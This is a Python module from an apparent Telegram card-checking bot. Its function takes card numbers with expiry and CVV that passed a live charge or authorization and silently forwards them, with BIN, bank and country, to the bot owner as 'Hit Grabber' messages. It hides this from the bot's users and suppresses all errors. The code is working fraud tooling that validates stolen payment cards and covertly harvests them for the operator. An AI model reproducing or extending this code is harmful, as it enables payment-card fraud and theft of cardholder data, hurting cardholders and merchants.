"""
Admin Forward Helper
Professionally forwards approved/charged card results to bot admin/owner.
Works silently without any prompts or information to public users.
"""

from pyrogram import Client
from pyrogram.types import Message
from BOT.db.store import load_owner_id

async def forward_success_card_to_admin(
    client: Client,
    card_data: str,
    status: str,
    response: str,
    gateway: str,
    price: str,
    checked_by: str,
    bin_info: str = "N/A",
    bank: str = "N/A",
    country: str = "N/A",
    retries: int = 0,
    receipt_id: str = None,
    time_taken: float = 0.0
):
    """
    Forward approved/charged card result to admin/owner's personal bot chat.
    This is done silently without any notification to public users.
    
    Args:
        client: Pyrogram Client instance
        card_data: Full card details (cc|mm|yy|cvv)
        status: Status text (e.g., "Charged 💎" or "Approved ✅")
        response: Raw response from gateway
        gateway: Gateway name (e.g., "Shopify Normal $10.00")
        price: Price charged/attempted
        checked_by: User who checked the card (mention or name)
        bin_info: BIN information string
        bank: Bank name
        country: Country name with flag
        retries: Number of retries
        receipt_id: Receipt ID if available
        time_taken: Time taken for check
    """
    try:
        owner_id = load_owner_id()
        if not owner_id:
            return  # No owner configured, skip forwarding
        
        owner_id = int(owner_id)
        
        # Build professional hit grabber message for admin
        cc_num = card_data.split("|")[0] if "|" in card_data else card_data
        header = "CHARGED" if "Charged" in status else "CCN LIVE"
        
        # Build receipt line if available
        receipt_line = ""
        if receipt_id:
            receipt_line = f"\n<b>[•] Receipt:</b> <code>{receipt_id}</code>"
        
        # Build time line if available
        time_line = ""
        if time_taken > 0:
            time_line = f"\n<b>[•] Time:</b> <code>{time_taken:.2f}s</code>"
        
        admin_message = f"""<b>[#Hit Grabber] | {header}</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card:</b> <code>{card_data}</code>
<b>[•] Gateway:</b> <code>{gateway}</code>
<b>[•] Status:</b> <code>{status}</code>
<b>[•] Response:</b> <code>{response}</code>
<b>[•] Retries:</b> <code>{retries}</code>{receipt_line}{time_line}
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] BIN:</b> <code>{cc_num[:6]}</code>
<b>[+] Info:</b> <code>{bin_info}</code>
<b>[+] Bank:</b> <code>{bank}</code> 🏦
<b>[+] Country:</b> <code>{country}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By:</b> {checked_by}
<b>[ϟ] Dev:</b> <a href="https://t.me/Chr1shtopher">Chr1shtopher</a>
━━━━━━━━━━━━━━━"""
        
        # Send to admin silently (no error if fails)
        try:
            await client.send_message(
                owner_id,
                admin_message,
                parse_mode="HTML",
                disable_web_page_preview=True
            )
        except Exception:
            # Silently fail - don't interrupt user experience
            pass
            
    except Exception:
        # Silently fail - don't interrupt user experience
        pass
